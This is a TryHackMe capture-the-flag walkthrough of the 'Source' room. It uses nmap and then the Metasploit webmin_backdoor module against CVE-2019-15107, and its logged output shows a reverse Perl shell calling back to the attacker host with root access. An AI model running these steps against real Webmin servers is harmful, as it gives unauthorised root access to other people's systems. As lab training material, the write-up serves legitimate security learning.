# Source — TryHackMe Walkthrough

**Target IP:** 10.48.131.168  
**Attack Machine:** Kali Linux  
**Attack IP:** 192.168.192.149  
**Difficulty:** Easy  
**Flags:** 2

---

## Flags Captured

| # | Flag | Method |
|---|------|--------|
| 1 | Flag{...} | Webmin RCE — /home/dark/user.txt |
| 2 | Flag{...} | Webmin RCE (root) — /root/root.txt |

---

## Phase 1 — Reconnaissance

### Nmap Scan
```
nmap -sC -sV 10.48.131.168 -oN nmap_scan.txt
```

**Open Ports:**
- 22/tcp — SSH (OpenSSH 7.6p1)
- 10000/tcp — HTTP (MiniServ 1.890 — Webmin httpd)

Webmin 1.890 is vulnerable to **CVE-2019-15107** — a backdoor inserted via a supply chain attack on SourceForge.

---

## Phase 2 — Exploitation (CVE-2019-15107)

### Launch Metasploit
```
msfconsole
msf6 > use exploit/linux/http/webmin_backdoor
msf6 > set RHOSTS 10.48.131.168
msf6 > set RPORT 10000
msf6 > set SSL true
msf6 > set LHOST 192.168.192.149
```

### Run the Exploit
```
msf6 > run

[*] Started reverse TCP handler
[*] Running automatic check
[+] The target is vulnerable.
[*] Sending cmd/unix/reverse_perl command payload
[+] Command shell session 1 opened
```

### Verify Root Access
```
whoami
root
```
Webmin runs as root — no privilege escalation needed.

---

## Phase 3 — Flag Capture

### Root Flag
```
cat /root/root.txt
Flag{...}
```

### User Flag
```
cat /home/dark/user.txt
Flag{...}
ls -la /home/dark/
-rw-rw-r-- 1 dark dark       29 Jun 26  2020 user.txt
-rw-rw-r-- 1 dark dark 15550066 Jun 26  2020 webmin_1.890_all.deb
```

The `webmin_1.890_all.deb` package in dark's home is the compromised Debian package containing the backdoor.

---

## Vulnerability Chain
1. **CVE-2019-15107** — Unauthenticated command injection via password_change.cgi
2. **No privesc needed** — Webmin runs as root, exploit grants immediate root access
